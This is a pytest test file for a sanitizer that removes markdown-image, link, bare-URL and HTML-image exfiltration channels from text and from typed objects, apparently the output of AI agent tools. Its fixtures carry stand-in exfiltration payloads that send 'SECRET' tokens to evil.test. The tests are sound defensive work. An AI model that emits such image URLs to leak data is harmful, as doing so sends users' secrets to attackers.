import uuid
from collections import namedtuple
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from types import SimpleNamespace

import pytest

from tessera.sanitize import sanitize_markdown, sanitize_value


def test_markdown_image_exfil_is_stripped():
    text = "Here is data ![pixel](https://evil.test/p?leak=sk-SECRET)"
    r = sanitize_markdown(text)
    assert "evil.test" not in r.text
    assert "sk-SECRET" not in r.text
    assert "image removed" in r.text
    assert "https://evil.test/p?leak=sk-SECRET" in r.removed
    assert r.changed


def test_allowlisted_host_survives():
    text = "![logo](https://cdn.trusted.test/logo.png)"
    r = sanitize_markdown(text, allowlist={"trusted.test"})
    assert "cdn.trusted.test/logo.png" in r.text
    assert not r.changed


def test_subdomain_of_allowlisted_host_survives():
    text = "![x](https://a.b.trusted.test/i.png)"
    r = sanitize_markdown(text, allowlist={"trusted.test"})
    assert "a.b.trusted.test" in r.text


def test_link_url_removed_but_text_kept():
    text = "see [the report](https://evil.test/leak?d=SECRET)"
    r = sanitize_markdown(text)
    assert "the report" in r.text
    assert "evil.test" not in r.text


def test_bare_url_defanged():
    text = "visit https://evil.test/leak?d=SECRET now"
    r = sanitize_markdown(text)
    assert "evil.test" not in r.text
    assert "url removed" in r.text


def test_html_img_tag_stripped():
    text = '<img src="https://evil.test/p?d=SECRET">'
    r = sanitize_markdown(text)
    assert "evil.test" not in r.text


def test_clean_text_unchanged():
    text = "Just some ordinary text with no urls."
    r = sanitize_markdown(text)
    assert r.text == text
    assert not r.changed


# --- deep (structured) sanitization ----------------------------------------

def test_sanitize_value_deep_in_dict_and_list():
    data = {
        "title": "ok",
        "messages": [
            {"body": "look ![x](https://evil.test/p?leak=SECRET)"},
            {"body": "clean message"},
        ],
    }
    out, removed = sanitize_value(data)
    assert "evil.test" not in str(out)
    assert "https://evil.test/p?leak=SECRET" in removed
    # structure is preserved (still a dict with a list of dicts)
    assert isinstance(out["messages"], list)
    assert out["messages"][1]["body"] == "clean message"


def test_sanitize_value_preserves_non_strings():
    out, removed = sanitize_value({"n": 42, "ok": True, "x": None, "items": [1, 2]})
    assert out == {"n": 42, "ok": True, "x": None, "items": [1, 2]}
    assert removed == []


def test_sanitize_value_string_leaf():
    out, removed = sanitize_value("visit https://evil.test/leak now")
    assert "evil.test" not in out
    assert removed


# -- typed objects ----------------------------------------------------------
#
# Real tools return objects, not JSON leaves (AgentDojo's Message, most MCP
# client bindings). If the walker stops at the object boundary, the flagship
# markdown-image channel stays wide open for exactly the common case.

@dataclass
class Msg:
    body: str
    n: int = 1


@dataclass(frozen=True)
class FrozenMsg:
    body: str


EXFIL = "![](https://evil.test/leak?x=SECRET)"


def test_dataclass_field_is_sanitized():
    """The issue's repro: this used to return the payload untouched."""
    out, removed = sanitize_value(Msg(body=EXFIL))
    assert "evil.test" not in out.body
    assert removed == ["https://evil.test/leak?x=SECRET"]
    assert isinstance(out, Msg) and out.n == 1


def test_frozen_dataclass_is_rebuilt():
    out, removed = sanitize_value(FrozenMsg(body=EXFIL))
    assert isinstance(out, FrozenMsg)
    assert "evil.test" not in out.body and removed


def test_namespace_is_sanitized():
    out, removed = sanitize_value(SimpleNamespace(body=EXFIL))
    assert "evil.test" not in out.body and removed


def test_slots_object_is_sanitized():
    """vars() sees nothing on a __slots__ class; the slot names must be read."""

    class Slotted:
        __slots__ = ("body", "n")

        def __init__(self, body):
            self.body = body
            self.n = 7

    out, removed = sanitize_value(Slotted(EXFIL))
    assert "evil.test" not in out.body and out.n == 7 and removed


def test_pydantic_model_is_sanitized():
    pydantic = pytest.importorskip("pydantic")

    class Model(pydantic.BaseModel):
        body: str
        n: int = 3

    original = Model(body=EXFIL)
    out, removed = sanitize_value(original)
    assert isinstance(out, Model)
    assert "evil.test" not in out.body and out.n == 3 and removed
    assert "evil.test" in original.body  # the caller's object is untouched


def test_the_original_object_is_never_mutated():
    original = Msg(body=EXFIL)
    out, _ = sanitize_value(original)
    assert out is not original
    assert "evil.test" in original.body


def test_object_with_nothing_to_strip_keeps_its_identity():
    original = Msg(body="nothing dangerous here")
    out, removed = sanitize_value(original)
    assert out is original and removed == []


def test_objects_nested_in_containers_are_reached():
    data = {"msgs": [Msg(body=EXFIL)], "pair": (Msg(body=EXFIL),)}
    out, removed = sanitize_value(data)
    assert len(removed) == 2
    assert "evil.test" not in out["msgs"][0].body
    assert "evil.test" not in out["pair"][0].body


def test_namedtuple_type_is_preserved():
    NT = namedtuple("NT", "body")
    out, removed = sanitize_value(NT(body=EXFIL))
    assert isinstance(out, NT) and "evil.test" not in out.body and removed


def test_sets_are_walked():
    out, removed = sanitize_value({EXFIL, "harmless"})
    assert removed and not any("evil.test" in s for s in out)


def test_enum_members_are_left_alone():
    class Color(Enum):
        RED = "red"

    out, removed = sanitize_value(Color.RED)
    assert out is Color.RED and removed == []


def test_self_referencing_graph_terminates():
    a = SimpleNamespace(body=EXFIL, peer=None)
    b = SimpleNamespace(body="safe", peer=a)
    a.peer = b
    out, removed = sanitize_value(a)
    assert removed and "evil.test" not in out.body


# -- making the residual gap visible ----------------------------------------

def test_unrebuildable_object_is_reported_not_silently_passed():
    class Immutable:
        __slots__ = ("body",)

        def __init__(self, body):
            object.__setattr__(self, "body", body)

        def __setattr__(self, *a):
            raise AttributeError("immutable")

    gaps: list[str] = []
    out, removed = sanitize_value(Immutable(EXFIL), unsanitized=gaps)
    # Honest: the payload survives, but it is no longer silent.
    assert "evil.test" in out.body
    assert gaps == ["Immutable (could not be rebuilt after sanitizing)"]
    # ...and we do not *claim* to have stripped a URL that is still sitting in
    # the value we handed back. ``removed`` becomes the ledger's `sanitize`
    # entry, so a false positive here would make the audit trail lie.
    assert removed == []


def test_rebuild_failure_does_not_roll_back_a_sibling_that_succeeded():
    """The rollback is scoped to the subtree that failed, not the whole walk."""

    class Immutable:
        __slots__ = ("body",)

        def __init__(self, body):
            object.__setattr__(self, "body", body)

        def __setattr__(self, *a):
            raise AttributeError("immutable")

    gaps: list[str] = []
    out, removed = sanitize_value(
        {"ok": {"body": EXFIL}, "bad": Immutable(EXFIL)}, unsanitized=gaps
    )
    # The dict branch really was sanitized, so its URL stays on the list.
    assert "evil.test" not in out["ok"]["body"]
    assert "evil.test" in out["bad"].body
    assert len(removed) == 1
    assert gaps == ["Immutable (could not be rebuilt after sanitizing)"]


def test_uninspectable_object_is_reported():
    class Opaque:
        __slots__ = ()

    gaps: list[str] = []
    sanitize_value(Opaque(), unsanitized=gaps)
    assert gaps == ["Opaque (no readable fields)"]


def test_stdlib_and_stateless_values_are_not_reported_as_gaps():
    """The warning must stay a signal, not noise."""
    gaps: list[str] = []
    sanitize_value(
        {"when": datetime(2020, 1, 1), "id": uuid.uuid4(), "n": 1, "s": "x"},
        unsanitized=gaps,
    )
    assert gaps == []


def test_depth_limit_is_reported_rather_than_recursing_forever():
    node = SimpleNamespace(body="deep")
    for _ in range(40):
        node = SimpleNamespace(child=node)
    gaps: list[str] = []
    sanitize_value(node, unsanitized=gaps)
    assert any("deeper than Tessera walks" in g for g in gaps)
